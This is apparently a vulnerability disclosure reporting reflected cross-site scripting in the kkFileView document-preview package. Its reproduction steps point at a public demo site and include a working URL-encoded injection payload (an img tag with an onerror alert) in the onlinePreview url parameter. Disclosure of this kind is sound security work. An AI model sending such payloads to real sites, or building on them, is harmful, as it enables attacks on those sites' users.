# Description

`kkFileView` this package is vulnerable to `Reflected Cross-Site Scripting (XSS)`.

https://github.com/kekingcn/kkFileView

# Steps To Reproduce-:  

1) install https://github.com/kekingcn/kkFileView locally or https://file.keking.cn/index use demo
2) use https://file.keking.cn/onlinePreview?url=f%22%3E%3Cimg%20src=x%20onerror=alert(222)%20~2F%3E 

# POC
  [gdrive](https://drive.google.com/file/d/1wd8udvN02Z5Z81VAVDZOtcf544Rs2bzE/view?usp=sharing)
